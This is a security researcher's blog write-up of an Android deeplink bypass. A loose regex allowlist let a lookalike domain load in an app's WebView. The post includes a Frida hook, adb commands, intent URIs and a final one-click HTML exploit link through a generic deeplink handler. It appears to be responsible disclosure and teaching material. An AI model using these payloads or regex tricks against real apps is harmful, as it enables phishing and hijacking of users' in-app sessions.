---
title: Regex Bypass - Escaping WebView Domain Filters
summary: An Android deeplink validation bypass that allowed loading arbitrary domains in the app's WebView through regex pattern mismatches.
date: "2025-03-18"
tags:
    - Android
---

I was testing this app. My intention of testing it was completely different from that of bug bounty, but then I kind of got distracted when I noticed that one of the app's exported activities accepts a data URI that just opens in webview.

Doing something like:

```bash
adb shell am start -a android.intent.action.VIEW -n com.someapp.android/.exported.StartActivity -d "customScheme://webpage?url=https://someapp.com/ourPrivacyPage"
```

The interesting bit was that if you used `http://google.com`, it won't do anything; it just takes you to the home/default opening view of the app. I tried looking around briefly, and I couldn't find the filtering logic in the decompiled code. One thing I was sure of was that it definitely opens a webview because when I went in `about > Privacy Policy, ` it opened a web view with the company's Privacy Policy webpage.

Since I didn't want to spend much time going through the mangled code I decided to write a frida script to see what was happening.

```js
    try {
        var webPageViewer = Java.use('com.someapp.android/.exported.StartActivity');
        webPageViewer.resolve.implementation = function(uri) {
            console.log("[+] webPageViewer.resolve called with: " + uri);
            var result = this.resolve(uri);
            console.log("[+] webPageViewer.resolve result: " + result);
            return result;
        };
    } catch (e) {
        console.log("[-] Could not hook: " + e);
    }
```

I had multiple of these hooks in my script, each for a different class, since I didn't know which class was doing the verification.

I ran the script with frida: `frida -U -l showMeURI.js -p 2233`, and got quite a lot of output but one of the interesting things I noticed was a JSON object, that had a lot of information along with the following key:

```json
"deeplink_validator": {
    "url_path_patterns": [
      "feature-pages([a-z-]+)*.someapp.com/.*",
      "content([a-z-]+)*.someapp.com/.*",
      "content[.]community(?:[.]staging)?[.]someapp[.]com[/].*",
        .....,
        .....,
        .....,
    ],
    "enabled": true
  },

```

The actual list was quite bigger it had several `www.someappOtherDomain.com/.*` at the end which I felt were difficult(almost impossible?) to bypass. But the above 3 URLs seemed "too broad" or you can say it felt like there might be an edge case that would let me construct a regex which is not `*.someapp.com`.

I quickly opened [regex101](https://regex101.com/) and started playing around and just in 1-2 trial found the following.

![](/images/content_regex.png)

`content-community-staging-someapp.com`, we can see that this is a completely different domain and not a subdomain of `someapp.com`. I quickly registered the domain and hosted JS code on it, using which I was able to show several other issues in the app caused by exposed JSInterfaces.

Once I was done buying the domain I realized I could have even used `content1someapp.com/` or replaced `1` with anything. But the reason I tried the bigger domain first was because I had seen the 3rd regex pattern and my brain only thought of that kind of pattern. 

Two days later, the dev asked, if it would be possible to exploit this via a single click, say a user receives an email with a URL in it and when they click on it, the malicious website opens in their app.

This was interesting because the activity I had called via ADB didn't have the `customScheme` in its Manifest and the activity that had that `customScheme://` under its intent filter wasn't exported.

```xml
<activity
    android:name="com.someapp.android.exported.StartActivity"
    android:exported="true"
    android:screenOrientation="portrait"
    android:configChanges="screenSize"
    android:windowSoftInputMode="adjustNothing|stateAlwaysHidden">
    <intent-filter>
        <data android:scheme="custom"/>
        <data android:host="start"/>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
    </intent-filter>
</activity>
```
    
```xml
<activity
    android:name="com.someapp.android.NotExported.WebActivity"
    android:exported="false"
    android:screenOrientation="portrait"
    android:windowSoftInputMode="stateAlwaysHidden">
    <intent-filter>
        <data
            android:scheme="customScheme"
            android:host="webpage"/>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>

```

The issue here is that if we build an intent and put it in the `href` it won't work.

```
<a href="intent:#Intent;component=com.someapp/.exported.StartActivity;S.url=https%3A%2F%2Fcontent-community-staging-someapp.com%2F;S.title=Test;end">Click to open app</a>
```
    
```
<a ref="intent://webpage?url=https%3A%2F%2Fcontent-community-staging-someapp.com%2F&title=Test#Intent;action=android.intent.action.VIEW;scheme=customScheme;package=com.someapp.android;component=com.someapp.android.exported.StartActivity;end">Click to exploit vulnerability</a>
```

The above links either won't open or will open the package page in the Google Play store with the option to `uninstall` or `Open` the app. This is because the Android system redirects intents based on what is defined in the Manifest, since the activity that handles the `customScheme` is __not__ exported, it will just show the app in the Google Play store
<span class="tooltip" data-show="false"><span class="tooltip-content">If you remove the `package=com.someapp.android` from the link, even that will stop happening<span></span>.

Anyway, my goal was to use _something_ that will be recognized by the Manifest but also lead to the malicious URL. One thing we know is that even though manifest shows `StartActivity` to only accept the `custom://` scheme in reality it even works with `customScheme://` 
<span class="tooltip" data-show="false"><span class="tooltip-content">we know this because our ADB command works<span></span>.

Looking at the most basic way to open the app was using its default deeplink:

```bash
adb shell am start -a android.intent.action.VIEW -d "https://someApp.tld/app_feature?deeplink=<ANY_DEEPLINK_HERE>"
```

The functionality above is managed by another exported activity that serves as a generic deep link route handler. However, as you can see, there is literally parameter called deeplink parameter. You can pass it any app defined host (without the scheme), even those that are not exported, and it will still work.

I just changed my adb command to following and it worked.

```bash
adb shell am start -a android.intent.action.VIEW -d "https://someApp.tld/app_feature?deeplink=webpage?url=https%3A%2F%2Fcontent-community-staging-someapp.com%2F"
```

Since this worked I made a webpage with the following link:

```html
<a href="https://someApp.tld/app_feature?deeplink=webpage?url=https%3A%2F%2Fcontent-community-staging-someapp.com%2F"> BOOM! </a>
```

I would say this though I wasted almost 2 hours on this simple thing, the very first time I tried the ADB command above, it didn't work and I thought this was not the way ahead and got back on the frida horse to explore more. The issue initially was that I was missing a `2` in my `%2F` encoding, so basically that 2 cost me 2 hours. <span class="tooltip" data-show="false"><span class="tooltip-content">I am happy that it wasn't a 3 or more :) <span></span>
